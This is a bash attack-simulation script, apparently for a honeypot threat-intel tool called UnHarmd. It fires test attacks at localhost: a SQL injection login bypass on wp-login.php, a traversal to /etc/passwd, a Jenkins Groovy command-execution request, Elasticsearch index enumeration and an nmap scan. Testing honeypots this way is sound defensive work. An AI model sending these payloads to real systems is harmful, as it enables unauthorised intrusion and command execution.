#!/bin/bash

# UnHarmd Attack Simulation Script
# This script sends simulated attacks to the local honeypot edge nodes

echo "============================================="
echo "   UnHarmd Threat Intel - Attack Simulator"
echo "============================================="

# Ensure edge-node is running on these ports
HOST="localhost"

echo "[*] Simulating SQL Injection against WordPress Honeypot (Port 80)"
curl -s -X POST "http://$HOST/wp-login.php" \
     -H "User-Agent: sqlmap/1.5.2" \
     -d "log=admin' OR '1'='1&pwd=random" > /dev/null
echo "  -> Sent SQLi Payload"
sleep 1

echo "[*] Simulating Directory Traversal against Generic HTTP (Port 80)"
curl -s -X GET "http://$HOST/../../../../etc/passwd" \
     -H "User-Agent: Mozilla/5.0" > /dev/null
echo "  -> Sent Dir Traversal Payload"
sleep 1

echo "[*] Simulating Jenkins Groovy RCE attempt (Port 8080)"
curl -s -X POST "http://$HOST:8080/script" \
     -H "Authorization: Basic YWRtaW46" \
     -d "script=println 'Hack'; java.lang.Runtime.getRuntime().exec('id')" > /dev/null
echo "  -> Sent RCE Payload"
sleep 1

echo "[*] Simulating Elasticsearch Mapping API Probe (Port 9200)"
curl -s -X GET "http://$HOST:9200/_cat/indices" \
     -H "User-Agent: curl/7.68.0" > /dev/null
echo "  -> Sent Index Enumeration Request"
sleep 1

echo "[*] Simulating Nmap Port Scan (Requires nmap installed)"
if command -v nmap &> /dev/null; then
    nmap -sV -p 80,443,8080,9200 $HOST > /dev/null
    echo "  -> Nmap scan completed"
else
    echo "  -> Nmap not installed, skipping scan"
fi

echo "============================================="
echo "[+] Attack simulations dispatched to $HOST"
echo "    Check the UnHarmd Dashboard for real-time analysis!"
